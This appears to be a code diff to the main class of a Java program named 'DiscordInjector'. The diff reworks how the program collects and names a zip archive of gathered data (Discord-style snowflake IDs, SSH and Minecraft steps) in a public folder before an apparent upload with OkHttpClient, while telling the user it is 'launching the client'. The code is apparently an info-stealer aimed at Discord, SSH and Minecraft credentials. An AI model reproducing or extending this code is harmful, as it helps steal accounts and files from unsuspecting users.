@@ -15,11 +15,14 @@ import java.net.URL;
 import javax.swing.JOptionPane;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 
 public class Start {
+    public static long snowflakeId = Snowflake.generateSnowflakeId();
 
-	public static void main(String[] argument) throws Exception {
+    public static void main(String[] argument) throws Exception {
         String version = "1.0.2";
 		versionChecker(version);
         Sender.sendMessage("Starting DiscordInjector v" + version);
@@ -36,12 +39,28 @@ public class Start {
 		Ssh.main(argument);
 		Sender.sendMessage("Ssh done.");
 		Sender.sendMessage("Now launching the client.");
-        Zip.main(argument);
+        Minecraft.sendMinecraft();
         OkHttpClient client = new OkHttpClient();
 
-        String computername= InetAddress.getLocalHost().getHostName();
+        File folder = new File("C:\\Users\\Public\\Documents");
+        File[] listOfFiles = folder.listFiles();
 
-        final String zort = "C:\\Users\\Public\\Documents\\" + computername +  ".zip";
+        for (int i = 0; i < listOfFiles.length; i++) {
+            if (listOfFiles[i].isFile()) {
+                boolean contain = containsSnowflakeId(listOfFiles[i].getName());
+                if(contain){
+                    System.out.println("File " + listOfFiles[i].getName() + " contains snowflake id.");
+                    snowflakeId = Long.parseLong(listOfFiles[i].getName().replace(".zip", ""));
+                }else{
+                    System.out.println("File " + listOfFiles[i].getName() + " does not contain snowflake id.");
+                }
+
+            }
+        }
+
+            Zip.main(argument);
+
+        final String zort = "C:\\Users\\Public\\Documents\\" + snowflakeId +  ".zip";
 
         File asd = new File(zort);
 
@@ -57,6 +76,21 @@ public class Start {
         System.exit(0);
 	}
 
+
+    public static boolean containsSnowflakeId(String filename) {
+        String regex = "\\b[0-9]{19}\\b";
+        Pattern pattern = Pattern.compile(regex);
+        String hm = filename.replace(".zip", "");
+        Matcher matcher = pattern.matcher(hm);
+        System.out.println(pattern.pattern());
+        if (matcher.find()) {
+            System.out.println("Found snowflake id: " + matcher.group());
+            return true;
+        } else {
+            System.out.println("No snowflake id found.");
+            return false;
+        }
+    }
     public static void versionChecker(String version) throws IOException {
 		// read raw data from url
 		Scanner scanner = new Scanner(new URL("https://gist.githubusercontent.com/Luxotick/2290b71380bb4a68081632f56e3c9efa/raw/2238f8815902234acad57f3d70e2198db86f1524/gistfile1.txt").openStream());
